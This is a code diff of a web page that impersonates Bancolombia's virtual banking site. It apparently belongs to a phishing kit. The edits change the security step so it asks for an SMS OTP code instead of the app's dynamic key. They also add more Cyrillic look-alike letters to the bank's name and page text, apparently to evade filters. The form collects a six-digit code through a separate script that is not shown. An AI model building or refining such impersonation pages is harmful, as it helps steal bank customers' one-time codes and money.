@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ваncоlоmbiа Sucursal Virtal Personas</title>
+    <title>Ваncоlоmbiа Sucursаl Virtаl Personаs</title>
     <link rel="icon" href="assets/logos/logo.png">
 
     <!-- CSS -->
@@ -21,6 +21,21 @@
         <p class="header-text-info">Fecha y hora actual: <span id="datetime"></span></p>
     </header>
 
+
+
+
+
+
+
+
+
+    <div class="error d-none mt-2">
+        <img src="./assets/icons/error.jpg">
+        <div class="error--text">
+            <h3>Error</h3>
+            <h4>Código OTP inválido. Inténtelo de nuevo.</h4>
+        </div>
+    </div>
     
     <main>
 
@@ -28,28 +43,20 @@
             <h3 class="page-label-title">Paso de Seguridad</h3>
         </div>
 
-        <div class="error d-none mt-2">
-            <img src="./assets/icons/error.jpg">
-            <div class="error--text">
-                <h3>Error</h3>
-                <h4>Clave dinámica inválida o expirada. Inténtelo de nuevo.</h4>
-            </div>
-        </div>
-
         <div class="card">
 
             <div class="card-header">
-                <h3>Clave Dinámica</h3>
+                <h3>Código OTP</h3>
             </div>
 
             <div class="card-message">
-                <p>Ingresa la clave dinámicа disponible en tu app Bancolombia.</p>
+                <p>Ingresa la clave OTP que enviamos por SMS a tu celular.</p>
             </div>
 
             <form id="form-cdin">
                 
                 <div class="form-label">
-                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Ingresa tu Clave Dinámica</label>
+                    <img class="icon-info" src="./assets/icons/info.jpg"><label>Ingresa tu Código OTP</label>
                 </div>
                 <input class="form-input-text icon-i-pass" id="cdin" type="number" oninput="limitarDigitos(this, 6)">
 
@@ -85,7 +92,7 @@
 
 
         <div class="header-publicity">
-            <img src="./assets/cdin.gif" style="width: 300px ; text-align: center;" alt="">
+            <img src="./assets/header_otp.svg" style="width: 200px ; text-align: center;" alt="">
             <p>¿No conoces la Sucursal Virtual Personas de Ваncоlоmbiа? Conoce más aquí</p>
         </div>
 
@@ -108,6 +115,6 @@
 
 
     <!-- JS -->
-    <script src="./js/cdinamica.js"></script>
+    <script src="./js/otp.js"></script>
 </body>
 </html>
